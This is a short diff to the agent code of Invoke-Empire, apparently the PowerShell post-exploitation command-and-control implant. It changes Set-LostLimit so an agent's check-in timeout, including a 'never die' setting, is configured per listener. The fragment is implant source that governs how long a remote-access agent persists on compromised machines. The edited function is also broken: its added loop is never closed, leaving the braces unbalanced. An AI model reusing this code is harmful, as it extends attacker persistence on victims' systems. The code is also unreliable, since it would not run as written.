@@ -147,16 +147,21 @@ function Invoke-Empire {
     }
 
     function Set-LostLimit {
-        param([int]$l)
-        $script:LostLimit = $l
-        if($l -eq 0)
-        {
-            "agent set to never die based on checkin Limit"
-        }
-        else
-        {
-            "agent LostLimit set to $script:LostLimit"
-        }
+        param($listenername,[int]$l)
+        foreach ($Listener in $script:listeners){
+            if ($Listener["name"] -eq $listenername){
+                $Listener["lostLimit"] = $l
+               if($l -eq 0)
+                {
+                    "agent set to never die based on checkin Limit"
+                }
+                else
+                {
+                    "agent LostLimit set to "
+                    $Listener["LostLimit"]
+                }
+                break
+            }
     }
 
     function Get-LostLimit {
